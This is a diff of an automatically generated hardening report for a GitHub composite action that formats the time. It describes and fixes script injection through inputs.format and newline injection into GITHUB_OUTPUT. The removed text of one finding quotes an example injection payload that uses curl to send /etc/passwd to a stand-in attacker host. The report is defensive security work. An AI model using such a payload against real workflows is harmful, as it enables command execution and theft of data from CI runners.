@@ -4,21 +4,19 @@
 
 > This file was generated automatically by the hardening agent.
 
-**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`
+**Policy SHA:** `374911c4be584df24e6da57af2d990570ef0f859`
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
 **Harden Agent Version:** `2`
 
-Action **nanzm--get-time-action/v2.0** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).
+Action **nanzm--get-time-action/v2.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Sub-rule (a): The `run:` block in action.yml directly interpolates `${{ inputs.format }}` inside the shell script string on line 28: `TEMPLATE="${{ inputs.format }}"`.
-
-The Actions runner substitutes this expression before the shell executes the script, so an attacker supplying a malicious `format` input (e.g. `"; curl http://evil.com/$(cat /etc/passwd); echo "`) can inject arbitrary shell commands. The value must be passed via an `env:` variable and then referenced as a quoted shell variable (e.g. `"$FORMAT"`) instead.
+Rule (a): the input expression is placed straight into the run: script of step 'time': `TEMPLATE="${{ inputs.format }}"`. The value is substituted into the script before bash runs it, so a format value containing `"`, `$(...)` or backticks can run any command. Fix: pass inputs.format through env (for example FORMAT: ${{ inputs.format }}) and use TEMPLATE="$FORMAT".
 
 Locations:
 
@@ -26,11 +24,11 @@ Locations:
 
 ### github-env-injection (severity: high)
 
-The `run:` block writes `$DATE` to `$GITHUB_OUTPUT` on line 35 (`echo "value=$DATE" >> $GITHUB_OUTPUT`) without sanitizing newlines first. `DATE` is derived from `TEMPLATE`, which is set directly from the untrusted `${{ inputs.format }}` expression. An attacker-controlled newline character in `inputs.format` could inject additional `key=value` pairs into `$GITHUB_OUTPUT`, potentially overwriting other outputs. The fix is to sanitize before writing: `safe=$(printf '%s' "$DATE" | tr -d '\n\r'); echo "value=$safe" >> "$GITHUB_OUTPUT"`.
+Step 'time' writes `echo "value=$DATE" >> $GITHUB_OUTPUT`. DATE is the output of `date` run with a template built from inputs.format, and inputs.timeZone also feeds in through TZ. A format containing newlines or %n can add extra lines to the output, which become extra output entries. Nothing strips newlines before the write. Fix: safe=$(printf '%s' "$DATE" | tr -d '\n\r'), then echo "value=$safe" >> "$GITHUB_OUTPUT".
 
 Locations:
 
-- `action.yml:35`
+- `action.yml:36`
 
 ### static-inline-injection (severity: high)
 
@@ -40,15 +38,50 @@ Locations:
 
 - `action.yml:28`
 
+### prior-fix (severity: high)
+
+Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. The previous harden changed action.yml without recording a finding for it, and this analysis reported nothing there. Re-apply its security changes unless the code no longer needs them. The previous patch:
+```diff
+diff --git a/action.yml b/action.yml
+index 3195555..ac6a421 100644
+--- a/action.yml
++++ b/action.yml
+@@ -20,12 +20,30 @@ outputs:
+ runs:
+   using: "composite"
+   steps:
+     - id: time
+       shell: bash
+       env:
+         TZ: ${{ inputs.timeZone }}
++        INPUT_FORMAT: ${{ inputs.format }}
+       run: |
+-        TEMPLATE="${{ inputs.format }}"
++        TEMPLATE="$INPUT_FORMAT"
+         TEMPLATE=${TEMPLATE/YYYY/%Y}
+         TEMPLATE=${TEMPLATE/MM/%m}
+         TEMPLATE=${TEMPLATE/DD/%d}
+@@ -33,4 +51,5 @@ runs:
+         TEMPLATE=${TEMPLATE/mm/%M}
+         TEMPLATE=${TEMPLATE/ss/%S}
+         DATE=$(date +"$TEMPLATE")
+-        echo "value=$DATE" >> $GITHUB_OUTPUT
++        safe=$(printf '%s' "$DATE" | tr -d '\n\r')
++        echo "value=$safe" >> "$GITHUB_OUTPUT"
+
+```
+
+Locations:
+
+- `action.yml`
+
 ## Iteration Notes
 
 ### Iteration 1
 
-**Fixes applied:** script-injection, github-env-injection, static-inline-injection
+**Fixes applied:** script-injection, static-inline-injection, github-env-injection, prior-fix
 
 **Notes:**
 
-Fixed all three findings in action.yml:
-1. script-injection & static-inline-injection: Moved `${{ inputs.format }}` from the `run:` block into the `env:` block as `INPUT_FORMAT: ${{ inputs.format }}`, then referenced it as `"$INPUT_FORMAT"` in the shell script. This prevents attacker-controlled input from being interpolated directly into the shell command string before execution.
-2. github-env-injection: Added newline sanitization before writing to GITHUB_OUTPUT: `safe=$(printf '%s' "$DATE" | tr -d '\n\r')` and then `echo "value=$safe" >> "$GITHUB_OUTPUT"`. This prevents newline injection attacks that could overwrite other output variables. Also properly quoted `"$GITHUB_OUTPUT"` for robustness.
+I edited the 'time' step in action.yml (I haven't run the action since). The format input now arrives through an env variable (INPUT_FORMAT) instead of being pasted straight into the script, and the script reads it with TEMPLATE="$INPUT_FORMAT". Before the date is written to $GITHUB_OUTPUT, newlines and carriage returns are removed with printf | tr -d '\n\r', and the path is now quoted. These are the same changes the previous harden made.
 
